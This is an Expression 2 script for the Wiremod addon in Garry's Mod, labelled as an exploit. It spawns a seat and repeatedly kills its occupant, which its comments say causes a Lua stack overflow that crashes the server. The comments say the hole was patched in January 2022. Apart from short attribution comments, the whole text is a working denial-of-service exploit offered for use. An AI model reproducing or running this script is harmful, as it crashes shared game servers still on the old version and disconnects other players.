@name exploits/ultra_suicide_crash
@inputs 
@outputs 
@persist MAX_DEATH CHAIR:entity DEATHS
@trigger

# Patched Jan 21 2022 in commit b896f88
# https://github.com/wiremod/wire/commit/b896f88

# concept by <unknown>
# shown to me by FaZe 360 = Disconnect
# causes a lua-level stack overflow

if( first() ){
    CHAIR = seatSpawn("models/nova/chair_plastic01.mdl", 1)
    runOnDeath(1)
    runOnTick(1)
    MAX_DEATH = 512
}

if( CHAIR:driver():isValid() & DEATHS < MAX_DEATH ){
    runOnTick(0)
    DEATHS++
    timer("reset",5000)
    CHAIR:killPod()
}

if( clk("reset") ){
    DEATHS = 0
    runOnTick(1)    
}
